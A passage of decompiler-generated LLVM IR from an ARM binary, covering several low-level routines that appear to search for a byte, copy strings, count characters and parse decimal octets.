  %v2_13c6c = icmp eq i32 %v0_13c68, 0
  br i1 %v2_13c6c, label %dec_label_pc_13c74, label %dec_label_pc_13c44

dec_label_pc_13c74:                               ; preds = %dec_label_pc_13c68
  %v0_13c74 = load i32, i32* @r4, align 4
  %v1_13c74 = inttoptr i32 %v0_13c74 to i32*
  %v2_13c74 = load i32, i32* %v1_13c74, align 4
  store i32 %v2_13c74, i32* %r3.global-to-local, align 4
  %v1_13c78 = add i32 %v0_13c74, 8
  %v2_13c78 = inttoptr i32 %v1_13c78 to i32*
  %v3_13c78 = load i32, i32* %v2_13c78, align 4
  store i32 %v3_13c78, i32* %r2.global-to-local, align 4
  %v1_13c7c = and i32 %v2_13c74, -65
  store i32 %v1_13c7c, i32* %r3.global-to-local, align 4
  %v3_13c80 = sdiv i32 %v2_13c74, 256
  store i32 %v3_13c80, i32* %r1.global-to-local, align 4
  %v2_13c84 = add i32 %v0_13c74, 28
  %v3_13c84 = inttoptr i32 %v2_13c84 to i32*
  store i32 %v3_13c78, i32* %v3_13c84, align 4
  %v0_13c88 = load i32, i32* %r1.global-to-local, align 4
  %v1_13c88 = trunc i32 %v0_13c88 to i8
  %v2_13c88 = load i32, i32* @r4, align 4
  %v3_13c88 = add i32 %v2_13c88, 1
  %v4_13c88 = inttoptr i32 %v3_13c88 to i8*
  store i8 %v1_13c88, i8* %v4_13c88, align 1
  %v0_13c8c = load i32, i32* %r3.global-to-local, align 4
  %v1_13c8c = trunc i32 %v0_13c8c to i8
  %v2_13c8c = load i32, i32* @r4, align 4
  %v3_13c8c = inttoptr i32 %v2_13c8c to i8*
  store i8 %v1_13c8c, i8* %v3_13c8c, align 1
  %v0_13c90.pre = load i32, i32* @r4, align 4
  %v0_13c9c.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_13c90

dec_label_pc_13c90:                               ; preds = %dec_label_pc_13c60, %dec_label_pc_13c74
  %v0_13c9c = phi i32 [ 0, %dec_label_pc_13c60 ], [ %v0_13c9c.pre, %dec_label_pc_13c74 ]
  %v2_13ca0 = phi i32 [ %v0_13c24, %dec_label_pc_13c60 ], [ %v0_13c90.pre, %dec_label_pc_13c74 ]
  %v1_13c90 = inttoptr i32 %v2_13ca0 to i32*
  %v2_13c90 = load i32, i32* %v1_13c90, align 4
  %v1_13c94 = or i32 %v2_13c90, 1
  store i32 %v1_13c94, i32* %r3.global-to-local, align 4
  %v3_13c98 = sdiv i32 %v2_13c90, 256
  store i32 %v3_13c98, i32* %r2.global-to-local, align 4
  %v1_13ca0 = trunc i32 %v3_13c98 to i8
  %v3_13ca0 = add i32 %v2_13ca0, 1
  %v4_13ca0 = inttoptr i32 %v3_13ca0 to i8*
  store i8 %v1_13ca0, i8* %v4_13ca0, align 1
  %v0_13ca4 = load i32, i32* %r3.global-to-local, align 4
  %v1_13ca4 = trunc i32 %v0_13ca4 to i8
  %v2_13ca4 = load i32, i32* @r4, align 4
  %v3_13ca4 = inttoptr i32 %v2_13ca4 to i8*
  store i8 %v1_13ca4, i8* %v3_13ca4, align 1
  %v2_13ca8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_13ca8, i32* @r4, align 4
  ret i32 %v0_13c9c

; uselistorder directives
  uselistorder i32 %v3_13c98, { 1, 0 }
  uselistorder i32 %v3_13c4c, { 1, 0 }
  uselistorder i32 %v3_13c24, { 1, 2, 0, 3 }
  uselistorder i32 %v0_13c24, { 0, 2, 1 }
  uselistorder i32 %v3_13c18, { 1, 0 }
  uselistorder i32 %v5_13bfc, { 0, 2, 1, 3 }
  uselistorder i32 ()* @function_d8c8, { 2, 5, 4, 3, 7, 6, 1, 0 }
  uselistorder i32 2176, { 1, 0 }
  uselistorder label %dec_label_pc_13c90, { 1, 0 }
  uselistorder label %dec_label_pc_13c38, { 1, 0 }
  uselistorder label %dec_label_pc_13c24, { 1, 0 }
}

define i32 @function_13cac(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_13cac:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg3, i32* %r3.global-to-local, align 4
  %v3_13cb0 = load i32, i32* @r4, align 4
  %v6_13cb0 = load i32, i32* @lr, align 4
  %v1_13cb4 = add i32 %arg1, 4
  %v2_13cb4 = inttoptr i32 %v1_13cb4 to i32*
  %v3_13cb4 = load i32, i32* %v2_13cb4, align 4
  store i32 %tmp, i32* @r4, align 4
  %v2_13cbc = load i32, i32* %arg2, align 4
  %v3_13cbc = add i32 %tmp, 4
  %v4_13cbc = inttoptr i32 %v3_13cbc to i32*
  %v5_13cbc = load i32, i32* %v4_13cbc, align 4
  %v6_13cc0 = call i32 @function_14b94(i32 %v3_13cb4, i32 %v2_13cbc, i32 %v5_13cbc, i32 %arg3, i32 %v3_13cb0, i32 %v6_13cb0)
  %v1_13cc4 = icmp slt i32 %v2_13cbc, 0
  %v6_13cc0. = select i1 %v1_13cc4, i32 %v6_13cc0, i32 0
  store i32 %v6_13cc0., i32* %r3.global-to-local, align 4
  br i1 %v1_13cc4, label %bb5, label %bb

bb:                                               ; preds = %dec_label_pc_13cac
  %v3_13cd0 = load i32, i32* @r4, align 4
  %v4_13cd0 = inttoptr i32 %v3_13cd0 to i32*
  store i32 %v6_13cc0, i32* %v4_13cd0, align 4
  %v6_13cd0 = add i32 %v3_13cd0, 4
  %v7_13cd0 = inttoptr i32 %v6_13cd0 to i32*
  store i32 %v2_13cbc, i32* %v7_13cd0, align 4
  %v0_13cd4.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb5

bb5:                                              ; preds = %dec_label_pc_13cac, %bb
  %v0_13cd4 = phi i32 [ %v6_13cc0, %dec_label_pc_13cac ], [ %v0_13cd4.pre, %bb ]
  ret i32 %v0_13cd4

; uselistorder directives
  uselistorder i32 %v6_13cc0, { 0, 2, 1 }
  uselistorder i32 %v2_13cbc, { 0, 2, 1 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @function_13cdc(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13d00:
  %v1_13ce0 = urem i32 %arg1, 256
  store i32 %v1_13ce0, i32* @lr, align 4
  %v4_13d00 = mul nuw nsw i32 %v1_13ce0, 256
  %v5_13d00 = or i32 %v4_13d00, %v1_13ce0
  %v4_13d08 = mul i32 %v5_13d00, 65536
  %v5_13d08 = or i32 %v4_13d08, %v5_13d00
  %v0_13d0c.pre = load i32, i32* @ip, align 4
  br label %dec_label_pc_13d0c

dec_label_pc_13d0c:                               ; preds = %dec_label_pc_13d78, %dec_label_pc_13d0c, %dec_label_pc_13d00
  %v0_13d0c = phi i32 [ %v0_13d0c.pre, %dec_label_pc_13d00 ], [ %v4_13d0c, %dec_label_pc_13d0c ], [ %v4_13d0c, %dec_label_pc_13d78 ]
  %v1_13d0c = inttoptr i32 %v0_13d0c to i32*
  %v2_13d0c = load i32, i32* %v1_13d0c, align 4
  %v4_13d0c = add i32 %v0_13d0c, 4
  store i32 %v4_13d0c, i32* @ip, align 4
  %v2_13d14 = xor i32 %v2_13d0c, %v5_13d08
  %v2_13d18 = add i32 %v2_13d14, 2130640639
  %v1_13d20 = sub i32 -1, %v2_13d14
  %v2_13d24 = xor i32 %v2_13d18, %v1_13d20
  %v2_13d28 = and i32 %v2_13d24, -2130640640
  %v2_13d2c = icmp eq i32 %v2_13d28, 0
  br i1 %v2_13d2c, label %dec_label_pc_13d0c, label %dec_label_pc_13d34

dec_label_pc_13d34:                               ; preds = %dec_label_pc_13d0c
  %v2_13d34 = inttoptr i32 %v0_13d0c to i8*
  %v3_13d34 = load i8, i8* %v2_13d34, align 1
  %v4_13d34 = zext i8 %v3_13d34 to i32
  %v9_13d3c = icmp eq i32 %v4_13d34, %v1_13ce0
  store i1 %v9_13d3c, i1* @cpsr_z, align 1
  %v1_13d40 = add i32 %v0_13d0c, 3
  %v1_13d44 = add i32 %v0_13d0c, 1
  store i32 %v1_13d44, i32* @r2, align 4
  %v1_13d48 = add i32 %v0_13d0c, 2
  br i1 %v9_13d3c, label %bb, label %bb18

bb:                                               ; preds = %dec_label_pc_13d34
  ret i32 %v0_13d0c

bb18:                                             ; preds = %dec_label_pc_13d34
  %v2_13d50 = inttoptr i32 %v1_13d44 to i8*
  %v3_13d50 = load i8, i8* %v2_13d50, align 1
  %v4_13d50 = zext i8 %v3_13d50 to i32
  %v9_13d54 = icmp eq i32 %v4_13d50, %v1_13ce0
  store i1 %v9_13d54, i1* @cpsr_z, align 1
  br i1 %v9_13d54, label %dec_label_pc_13d5c, label %dec_label_pc_13d64

dec_label_pc_13d5c:                               ; preds = %bb18
  ret i32 %v1_13d44

dec_label_pc_13d64:                               ; preds = %bb18
  %v2_13d64 = inttoptr i32 %v1_13d48 to i8*
  %v3_13d64 = load i8, i8* %v2_13d64, align 1
  %v4_13d64 = zext i8 %v3_13d64 to i32
  %v9_13d68 = icmp eq i32 %v4_13d64, %v1_13ce0
  store i1 %v9_13d68, i1* @cpsr_z, align 1
  br i1 %v9_13d68, label %dec_label_pc_13d70, label %dec_label_pc_13d78

dec_label_pc_13d70:                               ; preds = %dec_label_pc_13d64
  ret i32 %v1_13d48

dec_label_pc_13d78:                               ; preds = %dec_label_pc_13d64
  %v2_13d78 = inttoptr i32 %v1_13d40 to i8*
  %v3_13d78 = load i8, i8* %v2_13d78, align 1
  %v4_13d78 = zext i8 %v3_13d78 to i32
  %v9_13d7c = icmp eq i32 %v4_13d78, %v1_13ce0
  store i1 %v9_13d7c, i1* @cpsr_z, align 1
  br i1 %v9_13d7c, label %dec_label_pc_13d84, label %dec_label_pc_13d0c

dec_label_pc_13d84:                               ; preds = %dec_label_pc_13d78
  ret i32 %v1_13d40

; uselistorder directives
  uselistorder i32 %v4_13d0c, { 2, 1, 0 }
  uselistorder i32 %v0_13d0c, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_13d00, { 1, 0 }
  uselistorder i32 %v1_13ce0, { 2, 3, 4, 5, 6, 0, 1 }
}

define i32 @function_13d94(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_13d94:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13d94 = load i32, i32* @r4, align 4
  store i32 %v3_13d94, i32* %stack_var_-8, align 4
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13da0

dec_label_pc_13da0:                               ; preds = %dec_label_pc_13da0, %dec_label_pc_13d94
  %v0_13da0 = phi i32 [ %v5_13da0, %dec_label_pc_13da0 ], [ %tmp, %dec_label_pc_13d94 ]
  %v1_13da0 = inttoptr i32 %v0_13da0 to i8*
  %v2_13da0 = load i8, i8* %v1_13da0, align 1
  %v3_13da0 = zext i8 %v2_13da0 to i32
  store i32 %v3_13da0, i32* %ip.global-to-local, align 4
  %v5_13da0 = add i32 %v0_13da0, 1
  store i32 %v5_13da0, i32* %r3.global-to-local, align 4
  %v2_13da4 = icmp eq i8 %v2_13da0, 0
  store i1 %v2_13da4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13da4, label %dec_label_pc_13dac, label %dec_label_pc_13da0

dec_label_pc_13dac:                               ; preds = %dec_label_pc_13da0
  %v0_13dac = load i32, i32* %r2.global-to-local, align 4
  %v7_13dac = icmp eq i32 %v0_13dac, 3
  store i1 %v7_13dac, i1* %cpsr_z.global-to-local, align 1
  %v1_13db0 = add i32 %v0_13da0, -1
  store i32 %v1_13db0, i32* %lr.global-to-local, align 4
  %tmp10 = icmp ult i32 %v0_13dac, 4
  br i1 %tmp10, label %dec_label_pc_13e44thread-pre-split, label %dec_label_pc_13db8

dec_label_pc_13db8:                               ; preds = %dec_label_pc_13dac
  %v3_13db8 = udiv i32 %v0_13dac, 4
  store i32 %v3_13db8, i32* %r0.global-to-local, align 4
  %v0_13dbc.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_13dbc

dec_label_pc_13dbc:                               ; preds = %dec_label_pc_13e1c, %dec_label_pc_13db8
  %v2_13dc4 = phi i32 [ %v1_13e14, %dec_label_pc_13e1c ], [ %v1_13db0, %dec_label_pc_13db8 ]
  %v0_13dbc = phi i32 [ %v1_13e10, %dec_label_pc_13e1c ], [ %v0_13dbc.pre, %dec_label_pc_13db8 ]
  %v1_13dbc = inttoptr i32 %v0_13dbc to i8*
  %v2_13dbc = load i8, i8* %v1_13dbc, align 1
  %v3_13dbc = zext i8 %v2_13dbc to i32
  store i32 %v3_13dbc, i32* %r3.global-to-local, align 4
  %v2_13dc0 = icmp eq i8 %v2_13dbc, 0
  store i1 %v2_13dc0, i1* %cpsr_z.global-to-local, align 1
  %v3_13dc4 = add i32 %v2_13dc4, 1
  %v4_13dc4 = inttoptr i32 %v3_13dc4 to i8*
  store i8 %v2_13dbc, i8* %v4_13dc4, align 1
  %v0_13dc8 = load i32, i32* %lr.global-to-local, align 4
  %v1_13dc8 = add i32 %v0_13dc8, 1
  store i32 %v1_13dc8, i32* %ip.global-to-local, align 4
  %v0_13dcc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_13dcc, label %.loopexit, label %dec_label_pc_13dd0

dec_label_pc_13dd0:                               ; preds = %dec_label_pc_13dbc
  %v0_13dd0 = load i32, i32* @r1, align 4
  %v1_13dd0 = add i32 %v0_13dd0, 1
  %v2_13dd0 = inttoptr i32 %v1_13dd0 to i8*
  %v3_13dd0 = load i8, i8* %v2_13dd0, align 1
  %v4_13dd0 = zext i8 %v3_13dd0 to i32
  store i32 %v4_13dd0, i32* %r3.global-to-local, align 4
  %v2_13dd4 = icmp eq i8 %v3_13dd0, 0
  store i1 %v2_13dd4, i1* %cpsr_z.global-to-local, align 1
  %v3_13dd8 = add i32 %v0_13dc8, 2
  %v4_13dd8 = inttoptr i32 %v3_13dd8 to i8*
  store i8 %v3_13dd0, i8* %v4_13dd8, align 1
  %v0_13ddc = load i32, i32* @r1, align 4
  %v1_13ddc = add i32 %v0_13ddc, 1
  store i32 %v1_13ddc, i32* %r1.global-to-local, align 4
  %v0_13de0 = load i32, i32* %ip.global-to-local, align 4
  %v1_13de0 = add i32 %v0_13de0, 1
  store i32 %v1_13de0, i32* %ip.global-to-local, align 4
  %v0_13de4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_13de4, label %.loopexit, label %dec_label_pc_13de8

dec_label_pc_13de8:                               ; preds = %dec_label_pc_13dd0
  %v1_13de8 = add i32 %v0_13ddc, 2
  %v2_13de8 = inttoptr i32 %v1_13de8 to i8*
  %v3_13de8 = load i8, i8* %v2_13de8, align 1
  %v4_13de8 = zext i8 %v3_13de8 to i32
  store i32 %v4_13de8, i32* %r3.global-to-local, align 4
  %v2_13dec = icmp eq i8 %v3_13de8, 0
  store i1 %v2_13dec, i1* %cpsr_z.global-to-local, align 1
  %v3_13df0 = add i32 %v0_13de0, 2
  %v4_13df0 = inttoptr i32 %v3_13df0 to i8*
  store i8 %v3_13de8, i8* %v4_13df0, align 1
  %v0_13df4 = load i32, i32* %r1.global-to-local, align 4
  %v1_13df4 = add i32 %v0_13df4, 1
  store i32 %v1_13df4, i32* %r1.global-to-local, align 4
  %v0_13df8 = load i32, i32* %ip.global-to-local, align 4
  %v1_13df8 = add i32 %v0_13df8, 1
  store i32 %v1_13df8, i32* %lr.global-to-local, align 4
  %v0_13dfc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_13dfc, label %.loopexit, label %dec_label_pc_13e00

dec_label_pc_13e00:                               ; preds = %dec_label_pc_13de8
  %v1_13e00 = add i32 %v0_13df4, 2
  %v2_13e00 = inttoptr i32 %v1_13e00 to i8*
  %v3_13e00 = load i8, i8* %v2_13e00, align 1
  %v4_13e00 = zext i8 %v3_13e00 to i32
  store i32 %v4_13e00, i32* %ip.global-to-local, align 4
  store i32 %v1_13e00, i32* %r3.global-to-local, align 4
  %v2_13e08 = icmp eq i8 %v3_13e00, 0
  store i1 %v2_13e08, i1* %cpsr_z.global-to-local, align 1
  %v3_13e0c = add i32 %v0_13df8, 2
  %v4_13e0c = inttoptr i32 %v3_13e0c to i8*
  store i8 %v3_13e00, i8* %v4_13e0c, align 1
  %v0_13e10 = load i32, i32* %r3.global-to-local, align 4
  %v1_13e10 = add i32 %v0_13e10, 1
  store i32 %v1_13e10, i32* @r1, align 4
  %v0_13e14 = load i32, i32* %lr.global-to-local, align 4
  %v1_13e14 = add i32 %v0_13e14, 1
  store i32 %v1_13e14, i32* %lr.global-to-local, align 4
  %v0_13e18 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_13e18, label %.loopexit, label %dec_label_pc_13e1c

dec_label_pc_13e1c:                               ; preds = %dec_label_pc_13e00
  %v0_13e1c = load i32, i32* %r0.global-to-local, align 4
  %v1_13e1c = add i32 %v0_13e1c, -1
  store i32 %v1_13e1c, i32* %r0.global-to-local, align 4
  %v7_13e1c = icmp eq i32 %v0_13e1c, 1
  store i1 %v7_13e1c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_13e1c, label %dec_label_pc_13e24, label %dec_label_pc_13dbc

dec_label_pc_13e24:                               ; preds = %dec_label_pc_13e1c
  %v0_13e24 = load i32, i32* %r2.global-to-local, align 4
  %v1_13e24 = urem i32 %v0_13e24, 4
  store i32 %v1_13e24, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13e44

dec_label_pc_13e2c:                               ; preds = %dec_label_pc_13e44
  %v0_13e2c = load i32, i32* @r1, align 4
  %v1_13e2c = inttoptr i32 %v0_13e2c to i8*
  %v2_13e2c = load i8, i8* %v1_13e2c, align 1
  %v3_13e2c = zext i8 %v2_13e2c to i32
  store i32 %v3_13e2c, i32* %ip.global-to-local, align 4
  %v2_13e30 = icmp eq i8 %v2_13e2c, 0
  store i1 %v2_13e30, i1* %cpsr_z.global-to-local, align 1
  %v1_13e34 = add i32 %v1_13e50, -1
  store i32 %v1_13e34, i32* %r2.global-to-local, align 4
  %v3_13e38 = add i32 %v3_13e50, 1
  %v4_13e38 = inttoptr i32 %v3_13e38 to i8*
  store i8 %v2_13e2c, i8* %v4_13e38, align 1
  %v5_13e38 = load i32, i32* %lr.global-to-local, align 4
  %v6_13e38 = add i32 %v5_13e38, 1
  store i32 %v6_13e38, i32* %lr.global-to-local, align 4
  %v0_13e3c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_13e3c, label %.loopexit, label %dec_label_pc_13e40

dec_label_pc_13e40:                               ; preds = %dec_label_pc_13e2c
  %v0_13e40 = load i32, i32* @r1, align 4
  %v1_13e40 = add i32 %v0_13e40, 1
  store i32 %v1_13e40, i32* @r1, align 4
  %v0_13e44.pr.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13e44thread-pre-split

dec_label_pc_13e44thread-pre-split:               ; preds = %dec_label_pc_13e40, %dec_label_pc_13dac
  %v2_13e386 = phi i32 [ %v6_13e38, %dec_label_pc_13e40 ], [ %v1_13db0, %dec_label_pc_13dac ]
  %v0_13e44.pr = phi i32 [ %v0_13e44.pr.pre, %dec_label_pc_13e40 ], [ %v0_13dac, %dec_label_pc_13dac ]
  br label %dec_label_pc_13e44

dec_label_pc_13e44:                               ; preds = %dec_label_pc_13e44thread-pre-split, %dec_label_pc_13e24
  %v3_13e50 = phi i32 [ %v2_13e386, %dec_label_pc_13e44thread-pre-split ], [ %v1_13e14, %dec_label_pc_13e24 ]
  %v1_13e50 = phi i32 [ %v0_13e44.pr, %dec_label_pc_13e44thread-pre-split ], [ %v1_13e24, %dec_label_pc_13e24 ]
  %v2_13e44 = icmp eq i32 %v1_13e50, 0
  store i1 %v2_13e44, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13e44, label %dec_label_pc_13e4c, label %dec_label_pc_13e2c

dec_label_pc_13e4c:                               ; preds = %dec_label_pc_13e44
  %v0_13e4c = load i32, i32* %ip.global-to-local, align 4
  %v2_13e4c = icmp eq i32 %v0_13e4c, 0
  store i1 %v2_13e4c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13e4c, label %.loopexit, label %bb

bb:                                               ; preds = %dec_label_pc_13e4c
  %v4_13e50 = add i32 %v3_13e50, 1
  %v5_13e50 = inttoptr i32 %v4_13e50 to i8*
  store i8 0, i8* %v5_13e50, align 1
  br label %.loopexit

.loopexit:                                        ; preds = %dec_label_pc_13e00, %dec_label_pc_13de8, %dec_label_pc_13dd0, %dec_label_pc_13dbc, %dec_label_pc_13e2c, %dec_label_pc_13e4c, %bb
  %v0_13e54 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_13e54, i32* %r0.global-to-local, align 4
  %v2_13e58 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13e58, i32* @r4, align 4
  ret i32 %v0_13e54

; uselistorder directives
  uselistorder i32 %v1_13e50, { 1, 0 }
  uselistorder i32 %v1_13e24, { 1, 0 }
  uselistorder i32 %v0_13e1c, { 1, 0 }
  uselistorder i32 %v1_13e14, { 0, 2, 1 }
  uselistorder i32 %v1_13e10, { 1, 0 }
  uselistorder i32 %v0_13dac, { 2, 1, 0, 3 }
  uselistorder i32 %v5_13da0, { 1, 0 }
  uselistorder i32 %v0_13da0, { 0, 2, 1 }
  uselistorder i32 %tmp, { 0, 2, 1, 3 }
  uselistorder i32* %r2.global-to-local, { 3, 4, 5, 0, 1, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %lr.global-to-local, { 0, 4, 1, 2, 3, 5, 6 }
  uselistorder i32* %ip.global-to-local, { 6, 0, 1, 2, 3, 4, 5, 7 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 3, 1, 2, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder label %.loopexit, { 6, 5, 4, 0, 1, 2, 3 }
}

define i32 @function_13e5c(i8* %arg1) local_unnamed_addr {
dec_label_pc_13e5c:
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 0, i32* @lr, align 4
  %v0_13e942 = load i32, i32* @r0, align 4
  %v1_13e943 = inttoptr i32 %v0_13e942 to i8*
  %v2_13e944 = load i8, i8* %v1_13e943, align 1
  %v3_13e945 = zext i8 %v2_13e944 to i32
  store i32 %v3_13e945, i32* @r2, align 4
  %v2_13e986 = icmp eq i8 %v2_13e944, 0
  br i1 %v2_13e986, label %dec_label_pc_13ea4, label %dec_label_pc_13e70.preheader

dec_label_pc_13e68:                               ; preds = %dec_label_pc_13e70
  %v1_13e78 = add i32 %v0_13e78, 1
  %v9_13e68 = icmp eq i32 %v0_13e84, %v3_13e70
  br i1 %v9_13e68, label %dec_label_pc_13e84, label %dec_label_pc_13e70

dec_label_pc_13e70:                               ; preds = %dec_label_pc_13e70.preheader, %dec_label_pc_13e68
  %v0_13e78 = phi i32 [ %tmp, %dec_label_pc_13e70.preheader ], [ %v1_13e78, %dec_label_pc_13e68 ]
  %v1_13e70 = inttoptr i32 %v0_13e78 to i8*
  %v2_13e70 = load i8, i8* %v1_13e70, align 1
  %v3_13e70 = zext i8 %v2_13e70 to i32
  store i32 %v3_13e70, i32* @ip, align 4
  %v2_13e74 = icmp eq i8 %v2_13e70, 0
  br i1 %v2_13e74, label %dec_label_pc_13ea4, label %dec_label_pc_13e68

dec_label_pc_13e84:                               ; preds = %dec_label_pc_13e68
  %v2_13e84 = icmp eq i32 %v0_13e84, 0
  br i1 %v2_13e84, label %dec_label_pc_13ea4, label %dec_label_pc_13e8c

dec_label_pc_13e8c:                               ; preds = %dec_label_pc_13e84
  %v1_13e8c = add i32 %v0_13e8c, 1
  store i32 %v1_13e8c, i32* @lr, align 4
  %v1_13e90 = add i32 %v0_13e90, 1
  %v1_13e94 = inttoptr i32 %v1_13e90 to i8*
  %v2_13e94 = load i8, i8* %v1_13e94, align 1
  %v3_13e94 = zext i8 %v2_13e94 to i32
  store i32 %v3_13e94, i32* @r2, align 4
  %v2_13e98 = icmp eq i8 %v2_13e94, 0
  br i1 %v2_13e98, label %dec_label_pc_13ea4, label %dec_label_pc_13e70.preheader

dec_label_pc_13e70.preheader:                     ; preds = %dec_label_pc_13e5c, %dec_label_pc_13e8c
  %v0_13e90 = phi i32 [ %v1_13e90, %dec_label_pc_13e8c ], [ %v0_13e942, %dec_label_pc_13e5c ]
  %v0_13e8c = phi i32 [ %v1_13e8c, %dec_label_pc_13e8c ], [ 0, %dec_label_pc_13e5c ]
  %v0_13e84 = phi i32 [ %v3_13e94, %dec_label_pc_13e8c ], [ %v3_13e945, %dec_label_pc_13e5c ]
  br label %dec_label_pc_13e70

dec_label_pc_13ea4:                               ; preds = %dec_label_pc_13e84, %dec_label_pc_13e8c, %dec_label_pc_13e70, %dec_label_pc_13e5c
  %v0_13ea4 = phi i32 [ 0, %dec_label_pc_13e5c ], [ %v0_13e8c, %dec_label_pc_13e70 ], [ %v1_13e8c, %dec_label_pc_13e8c ], [ %v0_13e8c, %dec_label_pc_13e84 ]
  ret i32 %v0_13ea4

; uselistorder directives
  uselistorder i32 %v3_13e70, { 1, 0 }
  uselistorder i32 %v0_13e78, { 1, 0 }
  uselistorder label %dec_label_pc_13ea4, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_13e70.preheader, { 1, 0 }
}

define i32 @function_13eac(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13eac:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v6_13eac = load i32, i32* @r5, align 4
  %v2_13eb4 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg2, i32* @r5, align 4
  store i32 0, i32* @lr, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v2_13eb4, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-16, align 4
  %v2_13f3c3 = load i8, i8* %arg1, align 1
  %v3_13f3c4 = zext i8 %v2_13f3c3 to i32
  %v5_13f3c5 = add i32 %tmp, 1
  store i32 %v5_13f3c5, i32* @r4, align 4
  %v2_13f406 = icmp eq i8 %v2_13f3c3, 0
  store i1 %v2_13f406, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13f406, label %dec_label_pc_13f4c, label %dec_label_pc_13ed4

dec_label_pc_13ed4:                               ; preds = %dec_label_pc_13eac, %dec_label_pc_13f3c.backedge
  %v0_13f18 = phi i32 [ %v3_13f3c, %dec_label_pc_13f3c.backedge ], [ %v3_13f3c4, %dec_label_pc_13eac ]
  %v1_13f4410.in = phi i32 [ %v3_13f3c, %dec_label_pc_13f3c.backedge ], [ %v3_13f3c4, %dec_label_pc_13eac ]
  %v1_13f4410 = add nsw i32 %v1_13f4410.in, -48
  %v2_13ed4 = icmp ugt i32 %v1_13f4410, 8
  %v7_13ed4 = icmp eq i32 %v1_13f4410, 9
  store i1 %v7_13ed4, i1* %cpsr_z.global-to-local, align 1
  %v2_13edc = xor i1 %v7_13ed4, true
  %v3_13edc = and i1 %v2_13ed4, %v2_13edc
  br i1 %v3_13edc, label %dec_label_pc_13f18, label %dec_label_pc_13ee0

dec_label_pc_13ee0:                               ; preds = %dec_label_pc_13ed4
  %v0_13ee0 = load i32, i32* %r0.global-to-local, align 4
  %v1_13ee0 = inttoptr i32 %v0_13ee0 to i8*
  %v2_13ee0 = load i8, i8* %v1_13ee0, align 1
  %v3_13ee0 = zext i8 %v2_13ee0 to i32
  %v3_13ee8 = mul nuw nsw i32 %v3_13ee0, 10
  %v4_13ee8 = add nuw nsw i32 %v3_13ee8, %v0_13f18
  %v1_13eec = add nsw i32 %v4_13ee8, -48
  %v2_13ef0 = icmp ugt i32 %v1_13eec, 254
  %v7_13ef0 = icmp eq i32 %v1_13eec, 255
  store i1 %v7_13ef0, i1* %cpsr_z.global-to-local, align 1
  %v2_13ef4 = xor i1 %v7_13ef0, true
  %v3_13ef4 = and i1 %v2_13ef0, %v2_13ef4
  br i1 %v3_13ef4, label %dec_label_pc_13f70, label %dec_label_pc_13ef8

dec_label_pc_13ef8:                               ; preds = %dec_label_pc_13ee0
  %v0_13ef8 = load i32, i32* %r1.global-to-local, align 4
  %v2_13ef8 = icmp eq i32 %v0_13ef8, 0
  store i1 %v2_13ef8, i1* %cpsr_z.global-to-local, align 1
  %v1_13efc = trunc i32 %v1_13eec to i8
  store i8 %v1_13efc, i8* %v1_13ee0, align 1
  %v0_13f00 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_13f00, label %dec_label_pc_13f04, label %dec_label_pc_13f3c.backedge

dec_label_pc_13f04:                               ; preds = %dec_label_pc_13ef8
  %v0_13f04 = load i32, i32* @lr, align 4
  %v1_13f04 = add i32 %v0_13f04, 1
  store i32 %v1_13f04, i32* @lr, align 4
  %v7_13f08 = icmp eq i32 %v1_13f04, 4
  store i1 %v7_13f08, i1* %cpsr_z.global-to-local, align 1
